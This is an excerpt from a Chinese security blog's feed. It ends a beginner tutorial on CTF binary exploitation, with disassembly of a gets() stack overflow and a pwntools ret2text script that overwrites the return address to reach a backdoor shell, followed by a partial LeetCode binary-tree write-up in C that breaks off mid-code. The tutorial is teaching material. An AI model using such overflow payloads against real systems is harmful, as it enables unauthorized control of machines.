class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040055A ; Attributes: bp-based frame</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A                 public func</span><br><span class="line">.text:000000000040055A func            proc near               ; CODE XREF: main+4↓p</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A var_20          &#x3D; byte ptr -20h</span><br><span class="line">.text:000000000040055A</span><br><span class="line">.text:000000000040055A ; __unwind &#123;</span><br><span class="line">.text:000000000040055A                 push    rbp</span><br><span class="line">.text:000000000040055B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040055E                 sub     rsp, 20h</span><br><span class="line">.text:0000000000400562                 lea     rdi, s          ; &quot;tell me your name plz&quot;</span><br><span class="line">.text:0000000000400569                 call    _puts</span><br><span class="line">.text:000000000040056E                 lea     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000400572                 mov     rdi, rax</span><br><span class="line">.text:0000000000400575                 mov     eax, 0</span><br><span class="line">.text:000000000040057A                 call    _gets</span><br><span class="line">.text:000000000040057F                 nop</span><br><span class="line">.text:0000000000400580                 leave</span><br><span class="line">.text:0000000000400581                 retn</span><br><span class="line">.text:0000000000400581 ; &#125; &#x2F;&#x2F; starts at 40055A</span><br><span class="line">.text:0000000000400581 func            endp</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/10/7SCLieKoarEXu5m.png" alt="52DF40089C8FCCF9D5CF8DE7211B73D8.png"></p><p>接下来就来到了我们看到的前两行汇编代码：<code>push rbp</code>与<code>mov rbp, rsp</code>，我们不难从指令的英文释义上知道其流程：</p><ul><li><strong>将bp寄存器的值压入栈中</strong></li><li><strong>将sp寄存器的值赋给bp寄存器</strong></li></ul><p><img src="https://i.loli.net/2020/09/10/re1Z5dROXLE8PHp.png" alt="9CF0F7F5A8DA1972F88EF480E4FB6271.png"></p><p>接下来的<code>sub rsp, 20h</code>指令的作用是<strong>开辟栈空间</strong>，处在sp与bp之间的这一块区域便用于储存数据</p><p><img src="https://i.loli.net/2020/09/10/EPZ2iyr5UnQsgex.png" alt="A422C008B65723152D16FDDAD8421B38.png"></p><p>我们的<code>char str[20];</code>所占用的空间也在这里，同时我们可以发现我们<strong>虽然只分配了20个字节给str，但是程序却开辟了0x20个字节的数据，这是因为程序还要储存一些其他的数据</strong>（以后会学到）</p><p><img src="https://i.loli.net/2020/09/10/nM84Expy1KVLGc6.png" alt="227643CB6A805274DA147132CC0413DE.png"></p><p>那么接下来就进入到我们对<code>gets()</code>函数的漏洞的利用过程了，由于其不限制我们输入的字符串的长度，我们可以<strong>将返回地址前面的数据全部填充</strong>（<strong>padding</strong>）<strong>掉，并将返回地址覆写为别的地址，改变程序的执行流程</strong></p><p><img src="https://i.loli.net/2020/09/10/6Nt9GE1BWZ5ij2R.png" alt="AF0BBCCF20D852033C201460B566F5DA.png"></p><p>我们最终的目的是<strong>获取到shell</strong>，那么只要程序当中存在着<code>system(&quot;/bin/sh&quot;)</code>的函数调用，我们再将程序返回到其地址上，即可get shell</p><p>构造payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(sys_addr)<span class="comment"># 别忘了8字节的rbp哟</span></span><br></pre></td></tr></table></figure><p>我们之前在程序当中写了一个<code>backdoor()</code>函数，其中包含有能够getshell的语句，同时我们在IDA中可以看到其地址为<code>0x400547</code></p><p><img src="https://i.loli.net/2020/09/10/wg6HRpMc9mLdaBU.png" alt="image.png"></p><h4 id="攻击神器：pwntools"><a href="#攻击神器：pwntools" class="headerlink" title="攻击神器：pwntools"></a>攻击神器：pwntools</h4><p>接下来我们就需要考虑到如何将我们所构思出来的payload给输入到程序中了，那么这里我们就要用到一个对于每一位Pwner都十分重要的python库——<strong>pwntools</strong></p><blockquote><p>pwntools需要在<strong>Linux</strong>系统下使用（如Ubuntu、manjaro、kali等）</p><p>在shell中输入如下指令安装pwntools</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo pip install pwntools</span></span><br></pre></td></tr></table></figure></blockquote><p>使用pwntools库我们可以很方便地输入相应的payload</p><p>接下来我们就该开始构造我们用以get shell的脚本了，利用pwntools库，构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment"># 从pwntools库中导入所需要的一切</span></span><br><span class="line">p = process(<span class="string">'./test'</span>)<span class="comment"># 运行一个程序</span></span><br><span class="line"><span class="comment"># 需要注意的是，在连接远程服务器的时候，使用的是remote()</span></span><br><span class="line">    <span class="comment"># p = remote(addr,port)</span></span><br><span class="line">        <span class="comment"># 如：p = remote('sec.arttnba3.cn',10001)</span></span><br><span class="line">p.recv()<span class="comment"># 从程序中读取输入直到下一个断点（如遇到输入语句）</span></span><br><span class="line">sys_addr = p64(<span class="number">0x400547</span>)<span class="comment"># 将地址构造为符合小端模式的bytes数组，长度为8</span></span><br><span class="line"><span class="comment"># 需要注意的是在32位下应当使用p32()，长度为4</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x28</span> + sys_addr<span class="comment"># 构造我们的payload</span></span><br><span class="line">p.sendline(payload)<span class="comment"># 向程序发送我们的输入</span></span><br><span class="line"><span class="comment"># 需要注意的是，sendline()会在末尾添加换行符'\n'</span></span><br><span class="line">    <span class="comment"># 若不想要发送多余的换行符，可以使用send()方法</span></span><br><span class="line">p.interactive()<span class="comment"># 程序进入interactive模式，即进入我们与程序直接交互的界面</span></span><br></pre></td></tr></table></figure><p><strong>成功get shell</strong></p><p><img src="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png" alt="image.png"></p><p>至此，我们已经完成了<strong>从0开始利用gets()函数的栈溢出漏洞获取最高权限的整个过程</strong>，接下来就该靠你自己的努力，去分析、利用每一个可以被利用的系统漏洞，夺取最高权限了</p><p><strong>为了拥有“能够getshell任意一台设备”的能力而努力吧！新生代的黑客们！</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Pwn从入门到入狱&quot;&gt;&lt;a href=&quot;#Pwn从入门到入狱&quot; class=&quot;headerlink&quot; title=&quot;Pwn从入门到入狱&quot;&gt;&lt;/a&gt;Pwn从入门到入狱&lt;/h1&gt;&lt;p&gt;Copyright © 2020 arttnba3,XDSEC&lt;/p&gt;
&lt;h2 id=&quot;简介：什么是Pwn？&quot;&gt;&lt;a href=&quot;#简介：什么是Pwn？&quot; class=&quot;headerlink&quot; title=&quot;简介：什么是Pwn？&quot;&gt;&lt;/a&gt;简介：什么是Pwn？&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Pwn /poʊn/&lt;/strong&gt;这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即&lt;strong&gt;利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Pwn也是最能代表&lt;strong&gt;原教旨主义黑客&lt;/strong&gt;的一个安全研究方向&lt;del&gt;同时也是最容易进监狱的一个方向&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="ret2text" scheme="http://archive.next.arttnba3.cn/tags/ret2text/"/>
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>【OJ-0x0005-Leetcode】树部分write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90OJ-0x0005-Leetcode%E3%80%91%E6%A0%91%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90OJ-0x0005-Leetcode%E3%80%91%E6%A0%91%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-09-16T19:22:48.000Z</published>
    <updated>2020-10-14T16:35:16.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>本来不想这么快又开一篇新的blog的（<del>毕竟一篇OJ就是一个坑，前面的好多坑才刚刚开挖</del>），不过因为刚好做了每日一题的前置题目而刚好这道题又是树/图题所以想找个地方记录下来因此就开了一篇新博客</p><p>题好难做啊.jpg</p><a id="more"></a><h2 id="pre-什么是树"><a href="#pre-什么是树" class="headerlink" title="pre.什么是树"></a>pre.什么是树</h2><blockquote><p>树是一种抽象数据类型（ADT）或是实现这种抽象数据类型的数据结构，用来模拟具有树状结构性质的数据集合。它是由 n(n&gt;0)n(n&gt;0) 个有限节点组成一个具有层次关系的集合。</p><p><img src="https://i.loli.net/2020/09/18/X7l15qIoGtLN9hJ.png" alt="image.png"></p><p>把它叫做「树」是因为它看起来像一棵倒挂的树，也就是说它是根朝上，而叶朝下的。</p><p>它具有以下的特点：</p><p>每个节点都只有有限个子节点或无子节点；<br>没有父节点的节点称为根节点；<br>每一个非根节点有且只有一个父节点；<br>除了根节点外，每个子节点可以分为多个不相交的子树；<br>树里面没有环路。</p><p>链接：<a href="https://leetcode-cn.com/tag/tree/" target="_blank" rel="noopener">https://leetcode-cn.com/tag/tree/</a><br>来源：力扣（LeetCode）<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><p>构造一棵<strong>树</strong>的最简单的代码如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tree</span> * <span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tree</span> * <span class="title">child</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种结构是以下图的方式来保存一棵树的：</p><p><img src="https://i.loli.net/2020/09/17/cuRZvFXGaizQsom.png" alt="image.png"></p><p>构造一棵<strong>二叉树</strong>的代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tree</span> * <span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tree</span> * <span class="title">right</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>是不是很相似呢？其实可以把树的图歪过来康康…</p></blockquote><h1 id="0x01-难度：简单"><a href="#0x01-难度：简单" class="headerlink" title="0x01.难度：简单"></a>0x01.难度：简单</h1><h2 id="0x00-二叉树的最大深度"><a href="#0x00-二叉树的最大深度" class="headerlink" title="0x00.二叉树的最大深度"></a>0x00.<a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/" target="_blank" rel="noopener">二叉树的最大深度</a></h2><blockquote><p>给定一个二叉树，找出其最大深度。</p><p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p><p>说明: 叶子节点是指没有子节点的节点。</p><p>示例：<br>给定二叉树 [3,9,20,null,null,15,7]，</p><pre><code>3</code></pre><p>   / \<br>  9  20<br>    /  \<br>   15   7<br>返回它的最大深度 3 。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/maximum-depth-of-binary-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>我们很容易想到使用<strong>递归</strong>的方式获取其最大深度，即深度优先搜索</p><p>故构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(struct TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;left==<span class="literal">NULL</span>&amp;&amp;root-&gt;right==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    i=maxDepth(root-&gt;left)+<span class="number">1</span>;</span><br><span class="line">    j=maxDepth(root-&gt;right)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> i&gt;j?i:j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，递归会占用大量栈空间，因此内存消耗上并不是那么的理想（</p><p><img src="https://i.loli.net/2020/09/17/O1CDTlZgMUpXzVw.png" alt="image.png"></p><h2 id="0x01-翻转二叉树"><a href="#0x01-翻转二叉树" class="headerlink" title="0x01.翻转二叉树"></a>0x01.<a href="https://leetcode-cn.com/problems/invert-binary-tree/" target="_blank" rel="noopener">翻转二叉树</a></h2><blockquote><p>翻转一棵二叉树。</p><p>示例：</p><p>输入：</p><pre><code>4</code></pre><p>   /   \<br>  2     7<br> / \   / \<br>1   3 6   9<br>输出：</p><pre><code>4</code></pre><p>   /   <br>  7     2<br> / \   / <br>9   6 3   1<br>备注:<br>这个问题是受到 Max Howell 的 原问题 启发的 ：</p><p>谷歌：我们90％的工程师使用您编写的软件(Homebrew)，但是您却无法在面试时在白板上写出翻转二叉树这道题，这太糟糕了。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/invert-binary-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/invert-binary-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：该题为2020.9.16的每日一题</p></blockquote><p>很常规的也很简单的一道题目，只需<strong>逐层交换左右节点</strong>即可（<del>homebrew的开发者居然写不出这个题么</del>（<del>估计是太紧张le</del>（<del>👈不要在意这家伙天天乱讲</del></p><h3 id="解法一：递归"><a href="#解法一：递归" class="headerlink" title="解法一：递归"></a>解法一：递归</h3><p>一层一层交换结点的做法，我们很容易就想到递归，故构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">invertTree</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> * <span class="title">temp</span>;</span></span><br><span class="line">    temp = root-&gt;left;</span><br><span class="line">    root-&gt;left = root-&gt;right;</span><br><span class="line">    root-&gt;right = temp;</span><br><span class="line">    invertTree(root-&gt;left);</span><br><span class="line">    invertTree(root-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，递归调用会占用大量的栈空间（每次进行函数调用都会生成一个新的栈帧），所以空间复杂度上不是很好看（</p><p><img src="https://i.loli.net/2020/09/16/PaIkMX54n7zH1bJ.png" alt="image.png"></p><h3 id="解法二：广度优先搜索（队列）"><a href="#解法二：广度优先搜索（队列）" class="headerlink" title="解法二：广度优先搜索（队列）"></a>解法二：广度优先搜索（队列）</h3><p>大概过程如下：</p><ul><li>头结点入队</li><li>交换左右结点</li><li>左右结点入队</li><li>头结点出队</li></ul><p>队列为空时停止即可</p><p>因为数据范围不像OI那么变态（x），所以直接用一个很小的数组来储存即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">invertTree</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">int</span> start=<span class="number">0</span>, <span class="built_in">end</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> * (<span class="title">queue</span>[1000]), *<span class="title">temp</span>;</span></span><br><span class="line">    <span class="built_in">queue</span>[start] = root;</span><br><span class="line">    <span class="keyword">while</span>(start!=<span class="built_in">end</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>[start] != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = <span class="built_in">queue</span>[start]-&gt;left;</span><br><span class="line">            <span class="built_in">queue</span>[start]-&gt;left = <span class="built_in">queue</span>[start]-&gt;right;</span><br><span class="line">            <span class="built_in">queue</span>[start]-&gt;right = temp;</span><br><span class="line">            <span class="built_in">queue</span>[<span class="built_in">end</span>] = <span class="built_in">queue</span>[start]-&gt;left;</span><br><span class="line">            <span class="built_in">queue</span>[<span class="built_in">end</span>+<span class="number">1</span>] = <span class="built_in">queue</span>[start]-&gt;right;</span><br><span class="line">            <span class="built_in">end</span> += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        start++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/16/Y68GBXM2hlSKgzs.png" alt="image.png"></p><blockquote><p>以及这个故事实在是太搞了</p><p><img src="https://i.loli.net/2020/09/16/NW26F4OInxfqbmy.png" alt="image.png"></p></blockquote><h2 id="0x02-左叶子之和"><a href="#0x02-左叶子之和" class="headerlink" title="0x02. 左叶子之和"></a>0x02.<a href="https://leetcode-cn.com/problems/sum-of-left-leaves/" target="_blank" rel="noopener"> 左叶子之和</a></h2><blockquote><p>计算给定二叉树的所有左叶子之和。</p><p>示例：</p><p> 3<br>/ \<br>9  20<br>     / \<br>   15   7</p><p>在这个二叉树中，有两个左叶子，分别是 9 和 15，所以返回 24</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/sum-of-left-leaves" target="_blank" rel="noopener">https://leetcode-cn.com/problems/sum-of-left-leaves</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法一：深度优先搜索（DFS）"><a href="#解法一：深度优先搜索（DFS）" class="headerlink" title="解法一：深度优先搜索（DFS）"></a>解法一：深度优先搜索（DFS）</h3><p>一层一层地搜下去，若左结点为叶子结点（无子女）则加上左结点的值，否则搜索子结点，若右结点不为子结点则搜索右结点的子节点</p><p>得代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isLeaf</span><span class="params">(struct TreeNode * root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !root-&gt;left &amp;&amp; !root-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    ans += root-&gt;left ? (isLeaf(root-&gt;left) ? root-&gt;left-&gt;val : dfs(root-&gt;left)) : <span class="number">0</span>;</span><br><span class="line">    ans += (root-&gt;right!=<span class="literal">NULL</span>&amp;&amp;!isLeaf(root-&gt;right)) ? dfs(root-&gt;right) : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> root ? dfs(root) : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用三目运算符的一行流</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> root ? (root-&gt;left &amp;&amp; !root-&gt;left-&gt;left &amp;&amp; !root-&gt;left-&gt;right ? root-&gt;left-&gt;val + sumOfLeftLeaves(root-&gt;right) : sumOfLeftLeaves(root-&gt;left)+sumOfLeftLeaves(root-&gt;right)) : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/19/aIl9nXHm8vPQ6ZL.png" alt="image.png"></p><h3 id="解法二：广度优先搜索（BFS）-队列"><a href="#解法二：广度优先搜索（BFS）-队列" class="headerlink" title="解法二：广度优先搜索（BFS）+ 队列"></a>解法二：广度优先搜索（BFS）+ 队列</h3><p>这个解法是从官方的题解上看来的</p><p>使用队列数据结构来实现广度优先搜索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isLeafNode</span><span class="params">(struct TreeNode *node)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !node-&gt;left &amp;&amp; !node-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(struct TreeNode *root)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span 